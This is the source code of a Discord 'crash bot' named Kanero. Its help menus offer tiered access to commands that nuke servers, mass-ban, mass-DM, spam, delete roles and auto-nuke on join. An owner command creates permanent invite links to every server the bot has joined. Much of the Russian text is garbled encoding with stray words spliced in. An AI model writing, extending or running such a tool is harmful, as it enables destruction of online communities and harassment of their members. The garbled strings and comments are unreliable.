            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ �����.")
                return
            try:
                uid = int(args.strip())
                if uid not in PREMIUM_LIST:
                    PREMIUM_LIST.append(uid)
                    save_premium()
                if uid not in config.WHITELIST:
                    config.WHITELIST.append(uid)
                    save_whitelist()
                await message.channel.send(f"?? `{uid}` ������� **Premium** + навсегда � **Whitelist**.")
            except ValueError:
                await message.channel.send("�������������: `!pm_add <id>`")

        elif cmd_name == "pm_remove":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ �����.")
                return
            try:
                uid = int(args.strip())
                if uid in PREMIUM_LIST:
                    PREMIUM_LIST.remove(uid)
                    save_premium()
                    await message.channel.send(f"? `{uid}` ����� �� Premium.")
                else:
                    await message.channel.send("�� ������ � Premium.")
            except ValueError:
                await message.channel.send("�������������: `!pm_remove <id>`")

        elif cmd_name == "pm_list":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ �����.")
                return
            if not PREMIUM_LIST:
                await message.channel.send("Premium ������ ����.")
            else:
                lines = []
                for uid in PREMIUM_LIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` � **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` � *�� ������*")
                embed = discord.Embed(title="?? Premium ������", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"?? Kanero  |  �����: {len(PREMIUM_LIST)}")
                await message.channel.send(embed=embed)

        elif cmd_name == "unban":
            if not args:
                await message.channel.send("�������������: `!unban <user_id>`")
                return
            try:
                uid = int(args.strip())
                user = await bot.fetch_user(uid)
                unbanned = 0
                failed = 0
                for g in bot.guilds:
                    try:
                        await g.unban(user, reason="unban by owner")
                        unbanned += 1
                    except Exception:
                        failed += 1
                embed = discord.Embed(
                    title="?? ������ навсегда",
                    description=f"������������: **{user}** (`{uid}`)\n? навсегда �� **{unbanned}** навсегда\n? �� ������� �� **{failed}** навсегда",
                    color=0x0a0a0a
                )
                embed.set_footer(text="🤖 Kanero")
                await message.channel.send(embed=embed)
            except ValueError:
                await message.channel.send("�������������: `!unban <user_id>`")
            except discord.NotFound:
                await message.channel.send("? навсегда���� �� Готово.")

        else:
            await message.channel.send(f"? ���подписка истекла `{cmd_name}`. ������ `!owner_help`.")

    except Exception as e:
        await message.channel.send(f"? ������: {e}")


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # -- навсегда�� ����� �� ----------------------------------
    if isinstance(message.channel, discord.DMChannel):
        content = message.content.strip()

        # !help � !changelog � навсегда ���� � ��
        if content == "!help":
            uid = message.author.id
            is_owner = (uid == config.OWNER_ID)
            is_prem = is_premium(uid)
            is_wl = is_whitelisted(uid)
            is_fl = is_freelisted(uid)

            embed = discord.Embed(
                title="?? Kanero � CRASH BOT",
                description=(
                    "```\n"
                    "  ------�------�  -----� -------�--�  --�\n"
                    " --�====---�==--�--�==--�--�====---�  --�\n"
                    " --�     ------�--------�-------�-------�\n"
                    " --�     --�==--�--�==--�L====--�--�==--�\n"
                    " L------�--�  --�--�  --�-------�--�  --�\n"
                    "  L=====-L=-  L=-L=-  L=-L======-L=-  L=-\n"
                    "```"
                ),
                color=0x0a0a0a
            )
            if is_owner:
                access_str = "?? **OWNER** � ������ ������ ☠️ КРАШ СЕРВЕРА"
            elif is_prem:
                access_str = "?? **PREMIUM** � навсегда��� ������"
            elif is_wl:
                access_str = "? **Whitelist** � ������� �������"
            elif is_fl:
                access_str = "?? **Freelist** � ������� ������ (������� � #addbot)"
            else:
                access_str = "? **��� �������** � ������ � #addbot: https://discord.gg/nNTB37QNCG"

            embed.add_field(name="?? ���� ������� �������", value=access_str, inline=False)
            embed.add_field(
                name="?? FREELIST (������ � #addbot � навсегда�)",
                value=(
                    "`!nuke` � ���� �������\n"
                    "`!auto_nuke on/off/info` � ����-���� ��� ����� ����\n"
                    "`!help` � ��� ����\n"
                    "`!changelog` � `!changelogall` � ������� навсегда��"
                ),
                inline=False
            )
            embed.add_field(
                name="✅ WhiteLIST",
                value=(
                    "`!nuke [�����]` � ��� �� ����� �������\n"
                    "`!stop` � `!cleanup` � `!rename` � `!nicks_all`\n"
                    "`!webhooks` � `!clear [�����]` � `!inv`\n"
                    "`/sp [���-��] [�����]` � `/spkd [��������] [���-��] [�����]`"
                ),
                inline=False
            )
            embed.add_field(
                name="??"💎 Premium",
                value=(
                    "`!nuke [�����]` � ��� �� ����� �������\n"
                    "`!super_nuke [�����]` � ��� + ��� �� 15 навсегда��\n"
                    "`!massban` � `!massdm` � `!spam` � `!pingspam`\n"
                    "`!rolesdelete` � `!serverinfo` � `!userinfo`\n"
                    "`!auto_super_nuke on/off/text/info`"
                ),
                inline=False
            )
            embed.add_field(
                name="? OWNER",
                value=(
                    "`!wl_add/remove/list` � `!pm_add/remove/list`\n"
                    "`!block_guild / !unblock_guild / !blocked_guilds`\n"
                    "`!set_spam_text / !get_spam_text`\n"
                    "`!owl_add/remove/list`\n"
                    "`!guilds / !setguild / !invlink` (� ��)"
                ),
                inline=False
            )
            embed.add_field(
                name="?? ������ навсегда",
                value="Discord: **davaidkatt**\nTelegram: **@Firisotik**",
                inline=False
            )
            embed.set_footer(text="?? Kanero  |  !changelog � ������� навсегда��")
            embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
            await message.channel.send(embed=embed)
            return

        if content == "!changelog":
            ctx = await bot.get_context(message)
            await changelog(ctx)
            return

        # �� навсегда� � ������ ��� навсегда�
        if not is_whitelisted(message.author.id):
            return

        # !owner_help � ������ ���� ��-������ (������ OWNER_ID)
        if content == "!owner_help":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ��� �Готово.")
                return
            embed = discord.Embed(
                title="👑 OWNER PANEL Kanero",
                description=(
                    "```\n"
                    " ------�----�---------�---�----�-------�------�-\n"
                    " --�==--�---�----�----�----�---�--�====---�==--�\n"
                    " --�----�-L--�----�--�---�--�--�-----�--------�-\n"
                    " --�----�------�=----�---�L----�--�==-----�==--�\n"
                    " L-----�---L--�--L--�----�-L---�-------�--�----�\n"
                    " -L====-----L=----L=---L=---L==-L======-L=---L=-\n"
                    "```\n"
                    "> ?? ������ �� ������ ������ � ����� ����."
                ),
                color=0x0a0a0a
            )
            embed.add_field(
                name="??? �������",
                value=(
                    "`!guilds` � ������ навсегда ���� (������ ������)\n"
                    "`!setguild <id>` � ������� ������ �� ID\n"
                    "`!invlink` � ������-������ ☠️ КРАШ СЕРВЕРА"
                ),
                inline=False
            )
            embed.add_field(
                name="? ������� �� �������",
                value=(
                    "������ ������ > ���� ������� ����� � ��:\n"
                    "`!nuke` � `!stop` � `!cleanup`\n"
                    "`!rename` � `!nsfw_all` � `!unnsfw_all`\n"
                    "`!nicks_all` � `!webhooks`\n"
                    "`!auto_nuke on/off/info`"
                ),
                inline=False
            )
            embed.add_field(
                name="??"💎 Premium",
                value=(
                    "��� ���подписка истекла����� `!nuke [���� �����]`.\n\n"
                    "`!pm_add <id>` � ������ Premium\n"
                    "`!pm_remove <id>` � ������� Premium\n"
                    "`!pm_list` � ������ Premium навсегда�����"
                ),
                inline=False
            )
            embed.add_field(
                name="?? ����� ����",
                value=(
                    "��������� ����� �����все параллельно� ��� `!nuke` ��� навсегда��.\n\n"
                    "`!set_spam_text <�����>` � ������� �����\n"
                    "`!get_spam_text` � подписка истекла �����"
                ),
                inline=False
            )
            embed.add_field(
                name="?? ��подписка истекла�",
                value=(
                    "�������☠️ КРАШ СЕРВЕРА �� ������� � ����� �� навсегда� �� ������ все параллельно���� ���.\n\n"
                    "`!block_guild <id>` � навсегда�����\n"
                    "`!unblock_guild <id>` � навсегда������\n"
                    "`!blocked_guilds` � ����все параллельно����"
                ),
                inline=False
            )
            embed.add_field(
                name="?? OWNER WHITELIST",
                value=(
                    "`!owl_add <id>` � навсегда\n"
                    "`!owl_remove <id>` � ������\n"
                    "`!owl_list` � ������"
                ),
                inline=False
            )
            embed.add_field(
                name="??? ������ (����������)",
                value=(
                    "`!wl_add <id>` � ������ ������\n"
                    "`!wl_remove <id>` � ������� ������\n"
                    "`!wl_list` � ������ навсегда��"
                ),
                inline=False
            )
            embed.set_footer(text="?? Kanero  |  v2.0  |  ������� навсегда ������ � ��")
            embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
            await message.channel.send(embed=embed)
            return

        # !owl_add <id> � навсегда � owner whitelist (������ OWNER_ID)
        if content.startswith("!owl_add"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ ����� ����� навсегда� owner whitelist.")
                return
            try:
                uid = int(content.split()[1])
                if uid not in config.OWNER_WHITELIST:
                    config.OWNER_WHITELIST.append(uid)
                    save_owner_whitelist()
                    await message.channel.send(f"? `{uid}` навсегда � owner whitelist.")
                else:
                    await message.channel.send("��� � owner whitelist.")
            except (ValueError, IndexError):
                await message.channel.send("�������������: `!owl_add <id>`")
            return

        # !owl_remove <id> � ������ �� owner whitelist (������ OWNER_ID)
        if content.startswith("!owl_remove"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ ����� ����� навсегда� owner whitelist.")
                return
            try:
                uid = int(content.split()[1])
                if uid in config.OWNER_WHITELIST:
                    config.OWNER_WHITELIST.remove(uid)
                    save_owner_whitelist()
                    await message.channel.send(f"? `{uid}` ����� �� owner whitelist.")
                else:
                    await message.channel.send("�� ������ � owner whitelist.")
            except (ValueError, IndexError):
                await message.channel.send("�������������: `!owl_remove <id>`")
            return

        # !owl_list � навсегда owner whitelist (������ OWNER_ID)
        if content == "!owl_list":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ ����� ����� навсегда owner whitelist.")
                return
            if not config.OWNER_WHITELIST:
                await message.channel.send("Owner whitelist ����.")
            else:
                lines = []
                for uid in config.OWNER_WHITELIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` � **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` � *�� ������*")
                embed = discord.Embed(title="?? Owner Whitelist", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"?? Kanero  |  �����: {len(config.OWNER_WHITELIST)}")
                await message.channel.send(embed=embed)
            return

        # !guilds � навсегда ������ навсегда � навсегда ������
        if content == "!guilds":
            guilds = list(bot.guilds)
            if not guilds:
                await message.channel.send("��� �� �� навсегда.")
                return
            lines = "\n".join(f"`{g.id}` � {g.name}" for g in guilds)
            view = GuildSelectView(guilds, message.author.id)
            current = active_guild.get(message.author.id)
            current_name = bot.get_guild(current).name if current and bot.get_guild(current) else "�� ������"
            await message.channel.send(
                f"������� ���� (��������: **{current_name}**):\n{lines}\n\n������ ������ �������:",
                view=view
            )
            return

        # !invlink � навсегда ������-������ ☠️ КРАШ СЕРВЕРА
        if content == "!invlink":
            if not bot.guilds:
                await message.channel.send("��� �� �� навсегда.")
                return
            lines = []
            for g in bot.guilds:
                try:
                    ch = next((c for c in g.text_channels if c.permissions_for(g.me).create_instant_invite), None)
                    if ch:
                        inv = await ch.create_invite(max_age=0, max_uses=0, unique=True)
                        lines.append(f"**{g.name}** � {inv.url}")
                    else:
                        lines.append(f"**{g.name}** � ��� ���� �� подписка истекла")
                except Exception as e:
                    lines.append(f"**{g.name}** � ������: {e}")
            await message.channel.send("\n".join(lines))
            return

        # !setguild <id> � ������� ������ ������� �� ID
        if content.startswith("!setguild "):
            try:
                gid = int(content.split()[1])
                guild = bot.get_guild(gid)
                if not guild:
                    await message.channel.send("������ �� Готово.")
                    return
                active_guild[message.author.id] = gid
                await message.channel.send(f"? навсегда ������: **{guild.name}**")
            except (ValueError, IndexError):
                await message.channel.send("�������������: `!setguild <id>`")
            return

        # !block_guild [id] � навсегда����� ������ (������ OWNER_ID)
        if content.startswith("!block_guild"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ �����.")
                return
            parts = content.split()
            try:
                gid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("�������������: `!block_guild <id>`")
                return
            if not gid:
                await message.channel.send("����� ID �������: `!block_guild <id>`")
                return
            if gid not in BLOCKED_GUILDS:
                BLOCKED_GUILDS.append(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"?? ������ {name_str} навсегда����. ��� �� ����� �подписка истекла �� ���.")
            else:
                await message.channel.send("������ �все параллельно�.")
            return

        # !unblock_guild [id] � навсегда������ ������ (������ OWNER_ID)
        if content.startswith("!unblock_guild"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ �����.")
                return
            parts = content.split()
            try:
                gid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("�������������: `!unblock_guild <id>`")
                return
            if not gid:
                await message.channel.send("����� ID �������: `!unblock_guild <id>`")
                return
            if gid in BLOCKED_GUILDS:
                BLOCKED_GUILDS.remove(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"?? ������ {name_str} навсегда�����.")
            else:
                await message.channel.send("������ �� �все параллельно�.")
            return

        # !blocked_guilds � ������ �������подписка истекла� (������ OWNER_ID)
        if content == "!blocked_guilds":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ �����.")
                return
            if not BLOCKED_GUILDS:
                await message.channel.send("��� �������подписка истекла�.")
            else:
                lines = []
                for gid in BLOCKED_GUILDS:
                    g = bot.get_guild(gid)
                    lines.append(f"`{gid}` � {g.name if g else '����������'}")
                await message.channel.send("?? �������подписка истекла:\n" + "\n".join(lines))
            return

        # !pm_add <id> � ������ premium (������ OWNER_ID)
        if content.startswith("!pm_add"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ �����.")
                return
            parts = content.split()
            try:
                uid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("�������������: `!pm_add <id>`")
                return
            if not uid:
                await message.channel.send("����� ID: `!pm_add <id>`")
                return
            if uid not in PREMIUM_LIST:
                PREMIUM_LIST.append(uid)
                save_premium()
                await message.channel.send(f"?? `{uid}` ������� **Premium** � навсегда� ����� ��� `!nuke` навсегда�����.")
            else:
                await message.channel.send("��� � Premium.")
            return

        # !pm_remove <id> � ������� premium (������ OWNER_ID)
        if content.startswith("!pm_remove"):
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ �����.")
                return
            parts = content.split()
            try:
                uid = int(parts[1]) if len(parts) > 1 else None
            except ValueError:
                await message.channel.send("�������������: `!pm_remove <id>`")
                return
            if not uid:
                await message.channel.send("����� ID: `!pm_remove <id>`")
                return
            if uid in PREMIUM_LIST:
                PREMIUM_LIST.remove(uid)
                save_premium()
                await message.channel.send(f"? `{uid}` ����� �� Premium.")
            else:
                await message.channel.send("�� ������ � Premium.")
            return

        # !pm_list � ������ premium (������ OWNER_ID)
        if content == "!pm_list":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("? ������ �����.")
                return
            if not PREMIUM_LIST:
                await message.channel.send("Premium ������ ����.")
            else:
                lines = []
                for uid in PREMIUM_LIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` � **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` � *�� ������*")
                embed = discord.Embed(title="?? Premium ������", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"?? Kanero  |  �����: {len(PREMIUM_LIST)}")
                await message.channel.send(embed=embed)
            return

        # ����� ������ ������� � навсегда� �� подписка истекла
        DM_ONLY_COMMANDS = (
            "!help", "!changelog", "!owner_help", "!guilds", "!invlink",
            "!owl_add", "!owl_remove", "!owl_list",
            "!setguild", "!block_guild", "!unblock_guild", "!blocked_guilds",
            "!pm_add", "!pm_remove", "!pm_list",
        )
        if any(content == cmd or content.startswith(cmd + " ") for cmd in DM_ONLY_COMMANDS):
            return

        if content.startswith("!") and content != "!":
            # ������ ����� ����� �подписка истекла ����� ��
            if message.author.id != config.OWNER_ID:
                await message.channel.send(embed=discord.Embed(
                    description="? ������� � �� навсегда ������ Готово.",
                    color=0x0a0a0a
                ))
                return
            # ������� ������� навсегда ������, ����� � навсегда
            gid = active_guild.get(message.author.id) or HOME_GUILD_ID
            guild = bot.get_guild(gid)
            if not guild:
                await message.channel.send("? навсегда ������ навсегда��.")
                return
            await run_dm_command(message, guild, content)
            return

    # -- ������� навсегда� �� ������� ------------------------
    if message.guild and is_guild_blocked(message.guild.id):
        return  # ����все параллельно� � навсегда�� ��

    # -- навсегда�� ������ �� подписка истекла ��� ��-������� --
    if (message.guild and message.guild.id == HOME_GUILD_ID
            and message.content.startswith("!")
            and not message.author.bot
            and message.author.id != config.OWNER_ID
            and message.author.id not in config.OWNER_WHITELIST):
        try:
            await message.delete()
        except Exception:
            pass
        try:
            await message.author.send(
                embed=discord.Embed(
                    description="?? ������� �� ����� ������� �� навсегда.\n������ ���� �� ���� ������ � навсегда� ���.",
                    color=0x0a0a0a
                ).set_footer(text="🤖 Kanero")
            )
        except Exception:
            pass
        return

    # -- ����� addbot �� подписка истекла � ����� freelist ----------------------
    if (message.guild and message.guild.id == HOME_GUILD_ID
            and ("addbot" in message.channel.name.lower())
            and not message.author.bot):
        try:
            await message.delete()
        except Exception:
            pass
        if message.author.id == config.OWNER_ID:
            return
        uid = message.author.id
        if uid in FREELIST:
            try:
                await message.author.send(
                    embed=discord.Embed(
                        title="? � ���� ��� ���� ������� ������",
                        description=(
                            "�� ��� � freelist � ����все параллельно� `!nuke` � `!auto_nuke`.\n\n"
                            "��� ����подписка истекла ������: **davaidkatt**"
                        ),
                        color=0x0a0a0a
                    ).set_footer(text="Kanero  |  davaidkatt")
                )
            except Exception:
                pass
        else:
            FREELIST.append(uid)
            save_freelist()
            # ����� ���� ?? User �� подписка истекла
            try:
                home_guild = bot.get_guild(HOME_GUILD_ID)
                if home_guild:
                    member = home_guild.get_member(uid)
                    if not member:
                        member = await home_guild.fetch_member(uid)
                    if member:
                        user_role = discord.utils.find(lambda r: r.name == "??"👥 User", home_guild.roles)
                        if user_role:
                            await member.add_roles(user_role, reason="Freelist � ������� � addbot")
            except Exception:
                pass
            try:
                await message.author.send(
                    embed=discord.Embed(
                        title="? ������� ������ �������!",
                        description=(
                            "�� навсегда � freelist � ������� ���� **?? User**.\n\n"
                            "**�подписка истекла:**\n"
                            "`!nuke` � ���� �������\n"
                            "`!auto_nuke on/off` � ����-���� ��� ����� ����\n"
                            "`!help` � ������ ������\n"
                            "`!changelog` / `!changelogall` � ������� навсегда��\n\n"
                            "��� White/Premium ������: **davaidkatt** | **@Firisotik**\n\n"
                            "��� ������: https://discord.gg/nNTB37QNCG"
                        ),
                        color=0x0a0a0a
                    ).set_footer(text="Kanero  |  davaidkatt")
                )
            except Exception:
                pass
        return
    if message.content.strip() == "!" and is_whitelisted(message.author.id):
        ctx = await bot.get_context(message)
        await help_cmd(ctx)
        return
    await bot.process_commands(message)
    # навсегда ������ ���� ��� ������� (���������� � !)
    if message.content.startswith("!"):
        log.info("������� �� %s (%s) �� ������� %s: %s", message.author, message.author.id, message.guild, message.content)


@bot.event
async def on_ready():
    global AUTO_SUPER_NUKE, AUTO_SUPER_NUKE_TEXT, SNUKE_CONFIG
    global AUTO_SUPERPR_NUKE, AUTO_SUPERPR_NUKE_TEXT
    global AUTO_OWNER_NUKE, AUTO_OWNER_NUKE_TEXT
    global BLOCKED_GUILDS, PREMIUM_LIST, OWNER_NUKE_LIST, FREELIST

    # -- навсегда �� MongoDB --
    wl = await db_get("data", "whitelist")
    if wl is not None:
        config.WHITELIST = wl
    owl = await db_get("data", "owner_whitelist")
    if owl is not None:
        config.OWNER_WHITELIST = owl
    bl = await db_get("data", "blocked_guilds")
    if bl is not None:
        BLOCKED_GUILDS = bl
    pm = await db_get("data", "premium")
    if pm is not None:
        PREMIUM_LIST = pm
    # spam_text ������ ������ �� config.py (все параллельно����� �� MongoDB)
    asn = await db_get("data", "auto_super_nuke")
    if asn is not None:
        AUTO_SUPER_NUKE = asn.get("enabled", False)
        AUTO_SUPER_NUKE_TEXT = asn.get("text", None)
        if "config" in asn:
            SNUKE_CONFIG.update(asn["config"])
    aspn = await db_get("data", "auto_superpr_nuke")
    if aspn is not None:
        AUTO_SUPERPR_NUKE = aspn.get("enabled", False)
        AUTO_SUPERPR_NUKE_TEXT = aspn.get("text", None)

    aon = await db_get("data", "auto_owner_nuke")
    if aon is not None:
        AUTO_OWNER_NUKE = aon.get("enabled", False)
        AUTO_OWNER_NUKE_TEXT = aon.get("text", None)

    onl = await db_get("data", "owner_nuke_list")
    if onl is not None:
        OWNER_NUKE_LIST = onl

    fl = await db_get("data", "freelist")
    if fl is not None:
        FREELIST = fl
    
    # навсегда ������ навсегда
    tl = await db_get("data", "tester_list")
    if tl is not None:
        TESTER_LIST = tl
    
    # подписка истекла�� навсегда
    await load_temp_subscriptions()

    # -- навсегда���� persistent views (������ навсегда ���все параллельно) --
    bot.add_view(TicketCloseView())
    bot.add_view(TicketOpenView())
    # CompensationView � ���� навсегда�, custom_id="claim_comp_v2" навсегда� ��� ����
    bot.add_view(CompensationView("pm", 24, datetime.utcnow() + timedelta(days=365)))

    bot.tree.clear_commands(guild=None)

    print(f"��� ������� ��� {bot.user}")

    print(f"��� ������� ��� {bot.user}")


@bot.event
async def on_command_error(ctx, error):
    """��подписка истекла��� ������ � навсегда� ��� ����� �� ���."""
    # ������� �� ������� � ��подписка истекла��
    if isinstance(error, commands.CommandNotFound):
        cmd_text = ctx.message.content.split()[0][1:]  # ������� ! � ���� ������ �����
        embed = discord.Embed(
            title="? ������� �� �������",
            description=(
                f"������� `!{cmd_text}` �� навсегда��.\n\n"
                "**�������� �� ����� � ����:**\n"
                "`!nuke` � ���� �������\n"
                "`!help` � ������ ���� ������\n"
                "`!setup` � �подписка истекла\n"
                "`!list` � навсегда ������\n\n"
                "**����� ������?**\n"
                "������ `!help` ��� ������� ������ ������\n"
                "�все параллельно� � ������ �������: https://discord.gg/nNTB37QNCG"
            ),
            color=0xff0000
        )
        embed.set_footer(text="🤖 Kanero")
        await ctx.send(embed=embed)
        return

    # �� ������� навсегда��
    if isinstance(error, commands.MissingRequiredArgument):
        cmd = ctx.command
        usage = f"`!{cmd.name}`"
        if cmd.name == "compensate":
            usage = "`!compensate @user wl/pm/fl 2d`\n������: `!compensate @user pm 2d`"
        elif cmd.name == "announce_bug":
            usage = "`!announce_bug навсегда | навсегда`"
        elif cmd.name == "wl_add":
            usage = "`!wl_add @user`"
        elif cmd.name == "pm_add":
            usage = "`!pm_add @user`"
        elif cmd.name == "fl_add":
            usage = "`!fl_add @user`"
        elif cmd.name == "giverole":
            usage = "`!giverole @user @����`"
        elif cmd.name == "unban":
            usage = "`!unban <ID>`"
        else:
            usage = f"`!{cmd.name}` � �� ������� навсегда� `{error.param.name}`"
        await ctx.send(f"? **�� ������� навсегда��.**\n���������: {usage}")
        return

    # навсегда ��� навсегда�
    if isinstance(error, commands.BadArgument):
        cmd = ctx.command
        if cmd.name == "compensate":
            await ctx.send(
                "? **подписка истекла�.**\n"
                "���������: `!compensate @user wl/pm/fl 2d`\n"
                "**����:** `wl` � `pm` � `fl`\n"
                "**�����:** `2d` � `48h` � `24`"
            )
        else:
            await ctx.send(f"? **подписка истекла�.** ������� ����подписка истекла: `!{cmd.name}`")
        return

    # ��� ����
    if isinstance(error, commands.CheckFailure):
        return  # ����� навсегда�� � �� �все параллельно�

    # навсегда� ������ � навсегда �� �� ������
    if isinstance(error, commands.CommandInvokeError):
        original = error.original
        cmd_name = ctx.command.name if ctx.command else "?"
        await ctx.send(f"? ������ ��� навсегда�� `!{cmd_name}`: `{type(original).__name__}: {original}`")
        return


bot.run(config.TOKEN)















